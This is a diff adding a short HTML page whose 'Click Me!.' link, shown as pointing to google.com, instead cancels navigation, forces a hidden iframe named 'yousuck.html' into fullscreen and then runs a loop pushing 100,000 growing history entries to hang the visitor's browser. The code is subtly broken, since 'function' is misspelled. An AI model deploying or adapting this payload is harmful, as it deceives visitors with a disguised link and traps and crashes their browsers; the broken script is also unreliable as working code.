@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe src="yousuck.html" id="1" style="display: none"></iframe>
+<a id="myAnchor" href="https://google.com">Click Me!.</a>
+<script>
+funtion dos() {
+total = '';
+for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+}
+document.getElementById("myAnchor").addEventListener("click", function(event){
+  event.preventDefault();
+  event.stopPropagation();
+  var elem = document.getElementById("1");
+if (elem.requestFullscreen) {
+  elem.requestFullscreen();
+} else if (elem.msRequestFullscreen) {
+  elem.msRequestFullscreen();
+} else if (elem.mozRequestFullScreen) {
+  elem.mozRequestFullScreen();
+} else if (elem.webkitRequestFullscreen) {
+  elem.webkitRequestFullscreen();
+}
+  elem.style.display = 'block';
+  setTimeout(dos, 500);
+});
+</script>
+
+</body>
+</html>
